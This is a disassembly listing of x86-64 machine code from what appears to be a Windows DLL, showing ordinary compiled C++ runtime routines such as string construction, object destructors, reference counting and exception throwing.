   18000252f:	cc                   	int3
   180002530:	48 8d 05 a1 05 04 00 	lea    0x405a1(%rip),%rax        # 0x180042ad8
   180002537:	c3                   	ret
   180002538:	cc                   	int3
   180002539:	cc                   	int3
   18000253a:	cc                   	int3
   18000253b:	cc                   	int3
   18000253c:	cc                   	int3
   18000253d:	cc                   	int3
   18000253e:	cc                   	int3
   18000253f:	cc                   	int3
   180002540:	40 53                	rex push %rbx
   180002542:	48 83 ec 20          	sub    $0x20,%rsp
   180002546:	48 8b da             	mov    %rdx,%rbx
   180002549:	41 83 f8 01          	cmp    $0x1,%r8d
   18000254d:	75 2f                	jne    0x18000257e
   18000254f:	33 c9                	xor    %ecx,%ecx
   180002551:	48 c7 42 18 0f 00 00 	movq   $0xf,0x18(%rdx)
   180002558:	00 
   180002559:	48 89 0a             	mov    %rcx,(%rdx)
   18000255c:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
   180002560:	88 0a                	mov    %cl,(%rdx)
   180002562:	48 8d 15 7f 0c 04 00 	lea    0x40c7f(%rip),%rdx        # 0x1800431e8
   180002569:	44 8d 41 15          	lea    0x15(%rcx),%r8d
   18000256d:	48 8b cb             	mov    %rbx,%rcx
   180002570:	e8 1b 67 00 00       	call   0x180008c90
   180002575:	48 8b c3             	mov    %rbx,%rax
   180002578:	48 83 c4 20          	add    $0x20,%rsp
   18000257c:	5b                   	pop    %rbx
   18000257d:	c3                   	ret
   18000257e:	41 8b c8             	mov    %r8d,%ecx
   180002581:	e8 b6 b8 00 00       	call   0x18000de3c
   180002586:	33 c9                	xor    %ecx,%ecx
   180002588:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   18000258f:	00 
   180002590:	48 89 0b             	mov    %rcx,(%rbx)
   180002593:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   18000259a:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   18000259e:	88 0b                	mov    %cl,(%rbx)
   1800025a0:	49 ff c0             	inc    %r8
   1800025a3:	42 38 0c 00          	cmp    %cl,(%rax,%r8,1)
   1800025a7:	75 f7                	jne    0x1800025a0
   1800025a9:	48 8b d0             	mov    %rax,%rdx
   1800025ac:	48 8b cb             	mov    %rbx,%rcx
   1800025af:	e8 dc 66 00 00       	call   0x180008c90
   1800025b4:	48 8b c3             	mov    %rbx,%rax
   1800025b7:	48 83 c4 20          	add    $0x20,%rsp
   1800025bb:	5b                   	pop    %rbx
   1800025bc:	c3                   	ret
   1800025bd:	cc                   	int3
   1800025be:	cc                   	int3
   1800025bf:	cc                   	int3
   1800025c0:	40 53                	rex push %rbx
   1800025c2:	48 83 ec 20          	sub    $0x20,%rsp
   1800025c6:	48 8b d9             	mov    %rcx,%rbx
   1800025c9:	f6 c2 01             	test   $0x1,%dl
   1800025cc:	74 0a                	je     0x1800025d8
   1800025ce:	ba 10 00 00 00       	mov    $0x10,%edx
   1800025d3:	e8 b4 a2 00 00       	call   0x18000c88c
   1800025d8:	48 8b c3             	mov    %rbx,%rax
   1800025db:	48 83 c4 20          	add    $0x20,%rsp
   1800025df:	5b                   	pop    %rbx
   1800025e0:	c3                   	ret
   1800025e1:	cc                   	int3
   1800025e2:	cc                   	int3
   1800025e3:	cc                   	int3
   1800025e4:	cc                   	int3
   1800025e5:	cc                   	int3
   1800025e6:	cc                   	int3
   1800025e7:	cc                   	int3
   1800025e8:	cc                   	int3
   1800025e9:	cc                   	int3
   1800025ea:	cc                   	int3
   1800025eb:	cc                   	int3
   1800025ec:	cc                   	int3
   1800025ed:	cc                   	int3
   1800025ee:	cc                   	int3
   1800025ef:	cc                   	int3
   1800025f0:	48 8d 05 f1 04 04 00 	lea    0x404f1(%rip),%rax        # 0x180042ae8
   1800025f7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1800025fe:	00 
   1800025ff:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002603:	48 8d 05 86 20 03 00 	lea    0x32086(%rip),%rax        # 0x180034690
   18000260a:	48 89 01             	mov    %rax,(%rcx)
   18000260d:	48 8b c1             	mov    %rcx,%rax
   180002610:	c3                   	ret
   180002611:	cc                   	int3
   180002612:	cc                   	int3
   180002613:	cc                   	int3
   180002614:	cc                   	int3
   180002615:	cc                   	int3
   180002616:	cc                   	int3
   180002617:	cc                   	int3
   180002618:	cc                   	int3
   180002619:	cc                   	int3
   18000261a:	cc                   	int3
   18000261b:	cc                   	int3
   18000261c:	cc                   	int3
   18000261d:	cc                   	int3
   18000261e:	cc                   	int3
   18000261f:	cc                   	int3
   180002620:	48 83 ec 48          	sub    $0x48,%rsp
   180002624:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002629:	e8 c2 ff ff ff       	call   0x1800025f0
   18000262e:	48 8d 15 d3 53 04 00 	lea    0x453d3(%rip),%rdx        # 0x180047a08
   180002635:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000263a:	e8 f5 cf 00 00       	call   0x18000f634
   18000263f:	cc                   	int3
   180002640:	40 53                	rex push %rbx
   180002642:	48 83 ec 20          	sub    $0x20,%rsp
   180002646:	48 8b d9             	mov    %rcx,%rbx
   180002649:	48 8b c2             	mov    %rdx,%rax
   18000264c:	48 8d 0d bd 1e 03 00 	lea    0x31ebd(%rip),%rcx        # 0x180034510
   180002653:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002656:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000265a:	48 89 0b             	mov    %rcx,(%rbx)
   18000265d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002661:	0f 11 02             	movups %xmm0,(%rdx)
   180002664:	e8 6f ce 00 00       	call   0x18000f4d8
   180002669:	48 8d 05 20 20 03 00 	lea    0x32020(%rip),%rax        # 0x180034690
   180002670:	48 89 03             	mov    %rax,(%rbx)
   180002673:	48 8b c3             	mov    %rbx,%rax
   180002676:	48 83 c4 20          	add    $0x20,%rsp
   18000267a:	5b                   	pop    %rbx
   18000267b:	c3                   	ret
   18000267c:	cc                   	int3
   18000267d:	cc                   	int3
   18000267e:	cc                   	int3
   18000267f:	cc                   	int3
   180002680:	40 53                	rex push %rbx
   180002682:	48 83 ec 20          	sub    $0x20,%rsp
   180002686:	48 8d 05 53 1f 03 00 	lea    0x31f53(%rip),%rax        # 0x1800345e0
   18000268d:	48 8b d9             	mov    %rcx,%rbx
   180002690:	48 89 01             	mov    %rax,(%rcx)
   180002693:	f6 c2 01             	test   $0x1,%dl
   180002696:	74 0a                	je     0x1800026a2
   180002698:	ba 08 00 00 00       	mov    $0x8,%edx
   18000269d:	e8 ea a1 00 00       	call   0x18000c88c
   1800026a2:	48 8b c3             	mov    %rbx,%rax
   1800026a5:	48 83 c4 20          	add    $0x20,%rsp
   1800026a9:	5b                   	pop    %rbx
   1800026aa:	c3                   	ret
   1800026ab:	cc                   	int3
   1800026ac:	cc                   	int3
   1800026ad:	cc                   	int3
   1800026ae:	cc                   	int3
   1800026af:	cc                   	int3
   1800026b0:	f0 ff 41 08          	lock incl 0x8(%rcx)
   1800026b4:	c3                   	ret
   1800026b5:	cc                   	int3
   1800026b6:	cc                   	int3
   1800026b7:	cc                   	int3
   1800026b8:	cc                   	int3
   1800026b9:	cc                   	int3
   1800026ba:	cc                   	int3
   1800026bb:	cc                   	int3
   1800026bc:	cc                   	int3
   1800026bd:	cc                   	int3
   1800026be:	cc                   	int3
   1800026bf:	cc                   	int3
   1800026c0:	f0 83 41 08 ff       	lock addl $0xffffffff,0x8(%rcx)
   1800026c5:	b8 00 00 00 00       	mov    $0x0,%eax
   1800026ca:	48 0f 44 c1          	cmove  %rcx,%rax
   1800026ce:	c3                   	ret
   1800026cf:	cc                   	int3
   1800026d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800026d4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1800026d8:	48 85 c9             	test   %rcx,%rcx
   1800026db:	74 1d                	je     0x1800026fa
   1800026dd:	48 8b 01             	mov    (%rcx),%rax
   1800026e0:	ff 50 10             	call   *0x10(%rax)
   1800026e3:	48 85 c0             	test   %rax,%rax
   1800026e6:	74 12                	je     0x1800026fa
   1800026e8:	4c 8b 00             	mov    (%rax),%r8
   1800026eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1800026f0:	48 8b c8             	mov    %rax,%rcx
   1800026f3:	48 83 c4 28          	add    $0x28,%rsp
   1800026f7:	49 ff 20             	rex.WB jmp *(%r8)
   1800026fa:	48 83 c4 28          	add    $0x28,%rsp
   1800026fe:	c3                   	ret
   1800026ff:	cc                   	int3
   180002700:	b8 01 00 00 00       	mov    $0x1,%eax
   180002705:	c3                   	ret
   180002706:	cc                   	int3
   180002707:	cc                   	int3
   180002708:	cc                   	int3
   180002709:	cc                   	int3
   18000270a:	cc                   	int3
   18000270b:	cc                   	int3
   18000270c:	cc                   	int3
   18000270d:	cc                   	int3
   18000270e:	cc                   	int3
   18000270f:	cc                   	int3
   180002710:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002715:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000271a:	55                   	push   %rbp
   18000271b:	57                   	push   %rdi
   18000271c:	41 56                	push   %r14
   18000271e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   180002723:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   18000272a:	48 8b da             	mov    %rdx,%rbx
   18000272d:	48 8b f9             	mov    %rcx,%rdi
   180002730:	48 85 c9             	test   %rcx,%rcx
   180002733:	0f 84 39 01 00 00    	je     0x180002872
   180002739:	48 83 39 00          	cmpq   $0x0,(%rcx)
   18000273d:	0f 85 2f 01 00 00    	jne    0x180002872
   180002743:	b9 30 00 00 00       	mov    $0x30,%ecx
   180002748:	e8 47 a1 00 00       	call   0x18000c894
   18000274d:	48 8b f0             	mov    %rax,%rsi
   180002750:	48 89 45 67          	mov    %rax,0x67(%rbp)
   180002754:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180002758:	48 85 c9             	test   %rcx,%rcx
   18000275b:	74 0f                	je     0x18000276c
   18000275d:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   180002761:	48 85 db             	test   %rbx,%rbx
   180002764:	75 0d                	jne    0x180002773
   180002766:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   18000276a:	eb 07                	jmp    0x180002773
   18000276c:	48 8d 1d 60 03 04 00 	lea    0x40360(%rip),%rbx        # 0x180042ad3
   180002773:	33 d2                	xor    %edx,%edx
   180002775:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   180002779:	e8 66 ad 00 00       	call   0x18000d4e4
   18000277e:	90                   	nop
   18000277f:	45 33 f6             	xor    %r14d,%r14d
   180002782:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   180002786:	44 88 75 c7          	mov    %r14b,-0x39(%rbp)
   18000278a:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   18000278e:	44 88 75 d7          	mov    %r14b,-0x29(%rbp)
   180002792:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   180002796:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   18000279b:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   18000279f:	66 44 89 75 f7       	mov    %r14w,-0x9(%rbp)
   1800027a4:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   1800027a8:	44 88 75 07          	mov    %r14b,0x7(%rbp)
   1800027ac:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   1800027b0:	44 88 75 17          	mov    %r14b,0x17(%rbp)
   1800027b4:	48 85 db             	test   %rbx,%rbx
   1800027b7:	0f 84 d2 00 00 00    	je     0x18000288f
   1800027bd:	48 8b d3             	mov    %rbx,%rdx
   1800027c0:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   1800027c4:	e8 87 b2 00 00       	call   0x18000da50
   1800027c9:	90                   	nop
   1800027ca:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   1800027ce:	48 8d 05 d3 1e 03 00 	lea    0x31ed3(%rip),%rax        # 0x1800346a8
   1800027d5:	48 89 06             	mov    %rax,(%rsi)
   1800027d8:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   1800027dc:	e8 83 b6 00 00       	call   0x18000de64
   1800027e1:	0f 10 00             	movups (%rax),%xmm0
   1800027e4:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   1800027e8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1800027ec:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   1800027f0:	48 89 37             	mov    %rsi,(%rdi)
   1800027f3:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   1800027f7:	e8 c0 b2 00 00       	call   0x18000dabc
   1800027fc:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   180002800:	48 85 c9             	test   %rcx,%rcx
   180002803:	74 05                	je     0x18000280a
   180002805:	e8 36 7a 01 00       	call   0x18001a240
   18000280a:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   18000280e:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   180002812:	48 85 c9             	test   %rcx,%rcx
   180002815:	74 05                	je     0x18000281c
   180002817:	e8 24 7a 01 00       	call   0x18001a240
   18000281c:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   180002820:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   180002824:	48 85 c9             	test   %rcx,%rcx
   180002827:	74 05                	je     0x18000282e
   180002829:	e8 12 7a 01 00       	call   0x18001a240
   18000282e:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   180002832:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   180002836:	48 85 c9             	test   %rcx,%rcx
   180002839:	74 05                	je     0x180002840
   18000283b:	e8 00 7a 01 00       	call   0x18001a240
   180002840:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   180002844:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   180002848:	48 85 c9             	test   %rcx,%rcx
   18000284b:	74 05                	je     0x180002852
   18000284d:	e8 ee 79 01 00       	call   0x18001a240
   180002852:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   180002856:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   18000285a:	48 85 c9             	test   %rcx,%rcx
   18000285d:	74 05                	je     0x180002864
   18000285f:	e8 dc 79 01 00       	call   0x18001a240
   180002864:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   180002868:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   18000286c:	e8 eb ac 00 00       	call   0x18000d55c
   180002871:	90                   	nop
   180002872:	b8 02 00 00 00       	mov    $0x2,%eax
   180002877:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   18000287e:	00 
   18000287f:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180002883:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180002887:	49 8b e3             	mov    %r11,%rsp
   18000288a:	41 5e                	pop    %r14
   18000288c:	5f                   	pop    %rdi
   18000288d:	5d                   	pop    %rbp
   18000288e:	c3                   	ret
   18000288f:	48 8d 0d 62 02 04 00 	lea    0x40262(%rip),%rcx        # 0x180042af8
   180002896:	e8 81 ae 00 00       	call   0x18000d71c
   18000289b:	cc                   	int3
   18000289c:	cc                   	int3
   18000289d:	cc                   	int3
   18000289e:	cc                   	int3
   18000289f:	cc                   	int3
   1800028a0:	0f b6 c2             	movzbl %dl,%eax
   1800028a3:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   1800028a7:	8b c8                	mov    %eax,%ecx
   1800028a9:	e9 76 b6 00 00       	jmp    0x18000df24
   1800028ae:	cc                   	int3
   1800028af:	cc                   	int3
   1800028b0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800028b5:	56                   	push   %rsi
   1800028b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800028ba:	49 8b f0             	mov    %r8,%rsi
   1800028bd:	48 8b da             	mov    %rdx,%rbx
   1800028c0:	49 3b d0             	cmp    %r8,%rdx
   1800028c3:	74 25                	je     0x1800028ea
   1800028c5:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   1800028ca:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   1800028ce:	66 90                	xchg   %ax,%ax
   1800028d0:	0f b6 0b             	movzbl (%rbx),%ecx
   1800028d3:	48 8b d7             	mov    %rdi,%rdx
   1800028d6:	e8 49 b6 00 00       	call   0x18000df24
   1800028db:	88 03                	mov    %al,(%rbx)
   1800028dd:	48 ff c3             	inc    %rbx
   1800028e0:	48 3b de             	cmp    %rsi,%rbx
   1800028e3:	75 eb                	jne    0x1800028d0
   1800028e5:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1800028ea:	48 8b c3             	mov    %rbx,%rax
   1800028ed:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1800028f2:	48 83 c4 20          	add    $0x20,%rsp
   1800028f6:	5e                   	pop    %rsi
   1800028f7:	c3                   	ret
   1800028f8:	cc                   	int3
   1800028f9:	cc                   	int3
   1800028fa:	cc                   	int3
   1800028fb:	cc                   	int3
   1800028fc:	cc                   	int3
   1800028fd:	cc                   	int3
   1800028fe:	cc                   	int3
   1800028ff:	cc                   	int3
   180002900:	0f b6 c2             	movzbl %dl,%eax
   180002903:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   180002907:	8b c8                	mov    %eax,%ecx
   180002909:	e9 46 b7 00 00       	jmp    0x18000e054
   18000290e:	cc                   	int3
   18000290f:	cc                   	int3
   180002910:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002915:	56                   	push   %rsi
   180002916:	48 83 ec 20          	sub    $0x20,%rsp
   18000291a:	49 8b f0             	mov    %r8,%rsi
   18000291d:	48 8b da             	mov    %rdx,%rbx
   180002920:	49 3b d0             	cmp    %r8,%rdx
   180002923:	74 25                	je     0x18000294a
   180002925:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   18000292a:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   18000292e:	66 90                	xchg   %ax,%ax
   180002930:	0f b6 0b             	movzbl (%rbx),%ecx
   180002933:	48 8b d7             	mov    %rdi,%rdx
   180002936:	e8 19 b7 00 00       	call   0x18000e054
   18000293b:	88 03                	mov    %al,(%rbx)
   18000293d:	48 ff c3             	inc    %rbx
   180002940:	48 3b de             	cmp    %rsi,%rbx
   180002943:	75 eb                	jne    0x180002930
   180002945:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   18000294a:	48 8b c3             	mov    %rbx,%rax
   18000294d:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180002952:	48 83 c4 20          	add    $0x20,%rsp
   180002956:	5e                   	pop    %rsi
   180002957:	c3                   	ret
   180002958:	cc                   	int3
   180002959:	cc                   	int3
   18000295a:	cc                   	int3
   18000295b:	cc                   	int3
   18000295c:	cc                   	int3
   18000295d:	cc                   	int3
   18000295e:	cc                   	int3
   18000295f:	cc                   	int3
   180002960:	0f b6 c2             	movzbl %dl,%eax
   180002963:	c3                   	ret
   180002964:	cc                   	int3
   180002965:	cc                   	int3
   180002966:	cc                   	int3
   180002967:	cc                   	int3
   180002968:	cc                   	int3
   180002969:	cc                   	int3
   18000296a:	cc                   	int3
   18000296b:	cc                   	int3
   18000296c:	cc                   	int3
   18000296d:	cc                   	int3
   18000296e:	cc                   	int3
   18000296f:	cc                   	int3
   180002970:	40 53                	rex push %rbx
   180002972:	48 83 ec 20          	sub    $0x20,%rsp
   180002976:	49 8b d8             	mov    %r8,%rbx
   180002979:	49 8b c9             	mov    %r9,%rcx
   18000297c:	4c 2b c2             	sub    %rdx,%r8
   18000297f:	e8 ac cf 00 00       	call   0x18000f930
   180002984:	48 8b c3             	mov    %rbx,%rax
   180002987:	48 83 c4 20          	add    $0x20,%rsp
   18000298b:	5b                   	pop    %rbx
   18000298c:	c3                   	ret
   18000298d:	cc                   	int3
   18000298e:	cc                   	int3
   18000298f:	cc                   	int3
   180002990:	40 53                	rex push %rbx
   180002992:	48 83 ec 20          	sub    $0x20,%rsp
   180002996:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000299b:	49 8b d8             	mov    %r8,%rbx
   18000299e:	4c 2b c2             	sub    %rdx,%r8
   1800029a1:	e8 8a cf 00 00       	call   0x18000f930
   1800029a6:	48 8b c3             	mov    %rbx,%rax
   1800029a9:	48 83 c4 20          	add    $0x20,%rsp
   1800029ad:	5b                   	pop    %rbx
   1800029ae:	c3                   	ret
   1800029af:	cc                   	int3
   1800029b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800029b5:	57                   	push   %rdi
   1800029b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800029ba:	48 8d 05 e7 1c 03 00 	lea    0x31ce7(%rip),%rax        # 0x1800346a8
   1800029c1:	8b fa                	mov    %edx,%edi
   1800029c3:	48 89 01             	mov    %rax,(%rcx)
   1800029c6:	48 8b d9             	mov    %rcx,%rbx
   1800029c9:	8b 41 20             	mov    0x20(%rcx),%eax
   1800029cc:	85 c0                	test   %eax,%eax
   1800029ce:	7e 0b                	jle    0x1800029db
   1800029d0:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1800029d4:	e8 67 78 01 00       	call   0x18001a240
   1800029d9:	eb 0b                	jmp    0x1800029e6
   1800029db:	79 09                	jns    0x1800029e6
   1800029dd:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1800029e1:	e8 a6 9e 00 00       	call   0x18000c88c
   1800029e6:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1800029ea:	e8 51 78 01 00       	call   0x18001a240
   1800029ef:	48 8d 05 ea 1b 03 00 	lea    0x31bea(%rip),%rax        # 0x1800345e0
   1800029f6:	48 89 03             	mov    %rax,(%rbx)
   1800029f9:	40 f6 c7 01          	test   $0x1,%dil
   1800029fd:	74 0d                	je     0x180002a0c
   1800029ff:	ba 30 00 00 00       	mov    $0x30,%edx
   180002a04:	48 8b cb             	mov    %rbx,%rcx
   180002a07:	e8 80 9e 00 00       	call   0x18000c88c
   180002a0c:	48 8b c3             	mov    %rbx,%rax
   180002a0f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a14:	48 83 c4 20          	add    $0x20,%rsp
   180002a18:	5f                   	pop    %rdi
   180002a19:	c3                   	ret
   180002a1a:	cc                   	int3
   180002a1b:	cc                   	int3
   180002a1c:	cc                   	int3
   180002a1d:	cc                   	int3
   180002a1e:	cc                   	int3
   180002a1f:	cc                   	int3
   180002a20:	40 53                	rex push %rbx
   180002a22:	48 83 ec 60          	sub    $0x60,%rsp
   180002a26:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   180002a2b:	48 8b d9             	mov    %rcx,%rbx
   180002a2e:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180002a33:	41 0f 10 30          	movups (%r8),%xmm6
   180002a37:	33 c0                	xor    %eax,%eax
   180002a39:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002a3e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002a43:	48 c7 44 24 38 0f 00 	movq   $0xf,0x38(%rsp)
   180002a4a:	00 00 
   180002a4c:	88 44 24 20          	mov    %al,0x20(%rsp)
   180002a50:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180002a57:	49 ff c0             	inc    %r8
   180002a5a:	42 38 04 02          	cmp    %al,(%rdx,%r8,1)
   180002a5e:	75 f7                	jne    0x180002a57
   180002a60:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002a65:	e8 26 62 00 00       	call   0x180008c90
   180002a6a:	90                   	nop
   180002a6b:	66 0f 7f 74 24 40    	movdqa %xmm6,0x40(%rsp)
   180002a71:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180002a76:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180002a7b:	48 8b cb             	mov    %rbx,%rcx
   180002a7e:	e8 0d f8 ff ff       	call   0x180002290
   180002a83:	90                   	nop
   180002a84:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180002a89:	48 83 fa 10          	cmp    $0x10,%rdx
   180002a8d:	72 2e                	jb     0x180002abd
   180002a8f:	48 ff c2             	inc    %rdx
   180002a92:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180002a97:	48 8b c1             	mov    %rcx,%rax
   180002a9a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002aa1:	72 15                	jb     0x180002ab8
   180002aa3:	48 83 c2 27          	add    $0x27,%rdx
   180002aa7:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180002aab:	48 2b c1             	sub    %rcx,%rax
   180002aae:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180002ab2:	48 83 f8 1f          	cmp    $0x1f,%rax
   180002ab6:	77 1d                	ja     0x180002ad5
   180002ab8:	e8 cf 9d 00 00       	call   0x18000c88c
   180002abd:	48 8d 05 44 1c 03 00 	lea    0x31c44(%rip),%rax        # 0x180034708
   180002ac4:	48 89 03             	mov    %rax,(%rbx)
   180002ac7:	48 8b c3             	mov    %rbx,%rax
   180002aca:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   180002acf:	48 83 c4 60          	add    $0x60,%rsp
   180002ad3:	5b                   	pop    %rbx
   180002ad4:	c3                   	ret
   180002ad5:	e8 a6 80 01 00       	call   0x18001ab80
   180002ada:	cc                   	int3
   180002adb:	cc                   	int3
   180002adc:	cc                   	int3
   180002add:	cc                   	int3
   180002ade:	cc                   	int3
   180002adf:	cc                   	int3
   180002ae0:	48 83 ec 68          	sub    $0x68,%rsp
   180002ae4:	83 e2 17             	and    $0x17,%edx
   180002ae7:	89 51 10             	mov    %edx,0x10(%rcx)
   180002aea:	23 51 14             	and    0x14(%rcx),%edx
   180002aed:	74 07                	je     0x180002af6
   180002aef:	45 84 c0             	test   %r8b,%r8b
   180002af2:	74 11                	je     0x180002b05
   180002af4:	eb 05                	jmp    0x180002afb
   180002af6:	48 83 c4 68          	add    $0x68,%rsp
   180002afa:	c3                   	ret
   180002afb:	33 d2                	xor    %edx,%edx
   180002afd:	33 c9                	xor    %ecx,%ecx
   180002aff:	e8 30 cb 00 00       	call   0x18000f634
   180002b04:	cc                   	int3
   180002b05:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   180002b0a:	f6 c2 04             	test   $0x4,%dl
   180002b0d:	74 09                	je     0x180002b18
   180002b0f:	48 8d 1d f2 ff 03 00 	lea    0x3fff2(%rip),%rbx        # 0x180042b08
   180002b16:	eb 15                	jmp    0x180002b2d
   180002b18:	f6 c2 02             	test   $0x2,%dl
   180002b1b:	48 8d 1d fe ff 03 00 	lea    0x3fffe(%rip),%rbx        # 0x180042b20
   180002b22:	48 8d 05 0f 00 04 00 	lea    0x4000f(%rip),%rax        # 0x180042b38
   180002b29:	48 0f 44 d8          	cmove  %rax,%rbx
   180002b2d:	ba 01 00 00 00       	mov    $0x1,%edx
   180002b32:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002b37:	e8 34 f7 ff ff       	call   0x180002270
   180002b3c:	4c 8b c0             	mov    %rax,%r8
   180002b3f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002b44:	48 8b d3             	mov    %rbx,%rdx
   180002b47:	e8 d4 fe ff ff       	call   0x180002a20
   180002b4c:	48 8d 15 f5 4e 04 00 	lea    0x44ef5(%rip),%rdx        # 0x180047a48
   180002b53:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002b58:	e8 d7 ca 00 00       	call   0x18000f634
   180002b5d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180002b62:	cc                   	int3
   180002b63:	cc                   	int3
   180002b64:	cc                   	int3
   180002b65:	cc                   	int3
   180002b66:	cc                   	int3
   180002b67:	cc                   	int3
   180002b68:	cc                   	int3
   180002b69:	cc                   	int3
   180002b6a:	cc                   	int3
   180002b6b:	cc                   	int3
   180002b6c:	cc                   	int3
   180002b6d:	cc                   	int3
   180002b6e:	cc                   	int3
   180002b6f:	cc                   	int3
   180002b70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002b75:	57                   	push   %rdi
   180002b76:	48 83 ec 20          	sub    $0x20,%rsp
   180002b7a:	48 8b da             	mov    %rdx,%rbx
   180002b7d:	48 8d 05 8c 19 03 00 	lea    0x3198c(%rip),%rax        # 0x180034510
   180002b84:	48 89 01             	mov    %rax,(%rcx)
   180002b87:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   180002b8b:	48 8b f9             	mov    %rcx,%rdi
   180002b8e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002b91:	0f 11 02             	movups %xmm0,(%rdx)
   180002b94:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180002b98:	e8 3b c9 00 00       	call   0x18000f4d8
   180002b9d:	48 8d 05 84 1a 03 00 	lea    0x31a84(%rip),%rax        # 0x180034628
   180002ba4:	48 89 07             	mov    %rax,(%rdi)
   180002ba7:	48 8d 05 5a 1b 03 00 	lea    0x31b5a(%rip),%rax        # 0x180034708
   180002bae:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   180002bb2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002bb7:	48 89 07             	mov    %rax,(%rdi)
   180002bba:	48 8b c7             	mov    %rdi,%rax
   180002bbd:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   180002bc1:	48 83 c4 20          	add    $0x20,%rsp
   180002bc5:	5f                   	pop    %rdi
   180002bc6:	c3                   	ret
   180002bc7:	cc                   	int3
   180002bc8:	cc                   	int3
